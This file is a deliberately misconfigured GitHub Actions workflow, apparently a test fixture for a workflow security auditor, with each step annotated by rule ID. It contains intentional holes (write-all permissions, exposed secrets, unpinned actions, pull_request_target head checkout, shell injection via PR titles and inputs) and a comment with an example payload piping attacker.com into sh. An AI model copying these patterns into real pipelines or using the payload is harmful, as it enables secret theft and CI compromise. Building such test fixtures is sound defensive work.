@@ -1,0 +1,145 @@
+# bad_workflow.yml
+# A deliberately misconfigured GitHub Actions workflow used as a positive test case.
+# This workflow intentionally violates every security rule checked by actions_auditor:
+#
+# AA001 - permissions: write-all at top level
+# AA003 - secret exposed in top-level env block
+# AA004 - secret interpolated directly in a run script
+# AA005 - third-party actions not pinned to a full commit SHA
+# AA006 - pull_request_target trigger combined with head-ref checkout
+# AA007 - script injection via untrusted GitHub context in run script
+# AA008 - workflow_dispatch input interpolated directly in a run script
+#
+# Note: AA002 (missing permissions) is NOT triggered here because
+# permissions: write-all IS declared (which triggers AA001 instead).
+
+name: Bad Workflow - All Violations
+
+on:
+  pull_request_target:
+    types:
+      - opened
+      - synchronize
+  workflow_dispatch:
+    inputs:
+      deploy_env:
+        description: "Target deployment environment"
+        required: true
+        type: string
+      run_command:
+        description: "Command to run during deployment"
+        required: false
+        type: string
+  push:
+    branches:
+      - main
+
+# AA001: write-all grants unrestricted write access to the GITHUB_TOKEN.
+# This maximises the blast radius of any injection or supply-chain attack.
+permissions: write-all
+
+# AA003: Secrets exposed at the workflow (top) level are accessible to ALL
+# jobs and steps, including third-party actions that could exfiltrate them.
+env:
+  API_SECRET: ${{ secrets.API_SECRET }}
+  DATABASE_PASSWORD: ${{ secrets.DATABASE_PASSWORD }}
+  DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+
+jobs:
+  vulnerable_job:
+    name: Vulnerable Job
+    runs-on: ubuntu-latest
+
+    # AA003: Secrets at job level are accessible to all steps in the job.
+    env:
+      JOB_SECRET: ${{ secrets.JOB_SECRET }}
+
+    steps:
+      # AA005: Not pinned to a full commit SHA — tag can be silently repointed.
+      - name: Checkout attacker-controlled PR code
+        uses: actions/checkout@v4
+        with:
+          # AA006: Checking out the PR head SHA in a pull_request_target workflow
+          # executes attacker-controlled code with elevated GITHUB_TOKEN privileges.
+          # This is the root cause of major CI/CD supply-chain breaches.
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      # AA005: setup-python not pinned to a full commit SHA.
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+
+      # AA004: Secret interpolated directly into the run script.
+      # The secret value is baked into the shell command before execution,
+      # potentially appearing in logs, error messages, or process listings.
+      - name: Authenticate using secret in run script
+        run: |
+          curl -H "Authorization: Bearer ${{ secrets.API_SECRET }}" \
+               https://api.example.com/authenticate
+
+      # AA007: User-controlled PR title injected directly into a shell command.
+      # An attacker can set the PR title to include shell metacharacters like
+      # `; curl attacker.com/steal | sh` to execute arbitrary commands.
+      - name: Process pull request title
+        run: |
+          echo "Processing PR: ${{ github.event.pull_request.title }}"
+          notify.sh "${{ github.event.pull_request.title }}"
+
+      # AA007: Another injection vector via issue body.
+      - name: Log issue details
+        run: echo "Issue body: ${{ github.event.issue.body }}"
+
+      # AA008: workflow_dispatch input interpolated directly into a run script.
+      # Anyone who can trigger the workflow (manually or via the API) can
+      # supply a malicious value containing shell metacharacters.
+      - name: Deploy to environment
+        run: |
+          echo "Deploying to: ${{ inputs.deploy_env }}"
+          ./deploy.sh ${{ inputs.deploy_env }}
+
+      # AA008: Another workflow_dispatch input injection.
+      - name: Run custom command
+        run: ${{ inputs.run_command }}
+
+      # AA005: Third-party action not pinned to a commit SHA.
+      - name: Upload artefacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: build-output
+          path: dist/
+
+  another_vulnerable_job:
+    name: Another Vulnerable Job
+    runs-on: ubuntu-latest
+    # AA001: write permissions granted at job level.
+    permissions:
+      contents: write
+      packages: write
+
+    steps:
+      # AA005: cache action not pinned.
+      - name: Cache dependencies
+        uses: actions/cache@v3
+        with:
+          path: ~/.cache
+          key: cache-key
+
+      # AA007: Head ref used directly in shell command (script injection risk).
+      - name: Checkout head ref
+        run: |
+          git fetch origin
+          git checkout ${{ github.head_ref }}
+
+      # AA004: Another secret directly in a run script.
+      - name: Push to registry
+        run: |
+          echo ${{ secrets.REGISTRY_PASSWORD }} | docker login --username ci --password-stdin
+          docker push myimage:latest
+
+      # AA005: Third-party action from an external org, not SHA-pinned.
+      - name: Notify Slack
+        uses: slackapi/slack-github-action@v1.27.0
+        with:
+          channel-id: "C0123456789"
+          slack-message: "Deployment complete!"
